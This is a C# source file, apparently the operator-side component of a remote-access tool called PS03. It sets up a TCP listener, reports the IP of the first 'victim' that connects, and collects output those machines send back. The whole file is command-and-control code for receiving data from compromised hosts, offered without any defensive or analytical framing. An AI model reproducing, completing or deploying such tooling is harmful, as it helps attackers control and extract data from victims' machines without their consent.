using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace PS03.Network.Receive
{
    public class Listener
    {
        public delegate void OutputReadyHandler(string data);

        public delegate void VictimConnectedHandler(string data);

        private bool VictimHooked;
        public event OutputReadyHandler OnOutputReady;

        public event VictimConnectedHandler OnVictimConnected;

        public void HandleOutputReady(string output)
        {
            OnOutputReady?.Invoke(output);
        }

        public void HandleVictimConnected(string victim)
        {
            OnVictimConnected?.Invoke(victim);
        }

        public void start(int port)
        {
            var listener = new TcpListener(port);
            var connected = false;

            while (!connected)
            {
                try
                {
                    listener.Start();
                    connected = true;
                }
                catch (Exception)
                {
                    Thread.Sleep(200);
                }
            }

            while (true)
            {
                var client = listener.AcceptSocket();
                if (!VictimHooked)
                {
                    var remoteIpEndPoint = client.RemoteEndPoint as IPEndPoint;
                    HandleVictimConnected(remoteIpEndPoint.Address.ToString());
                    VictimHooked = true;
                }

                var childSocketThread = new Thread(() =>
                {
                    var data = new byte[5000000];
                    var size = client.Receive(data);

                    var rcv = "";
                    for (var i = 0; i < size; i++)
                        rcv += (Convert.ToChar(data[i]));

                    HandleOutputReady(rcv);

                    client.Close();
                });
                childSocketThread.Start();
            }
        }
    }
}